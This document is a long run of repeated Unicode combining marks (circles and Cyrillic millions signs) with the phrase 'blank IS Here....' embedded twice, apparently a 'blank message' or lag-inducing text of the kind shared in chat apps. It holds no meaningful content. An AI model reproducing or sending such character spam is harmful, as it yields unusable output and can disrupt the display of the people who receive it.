⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝blank IS Here....҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝blank IS Here....҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉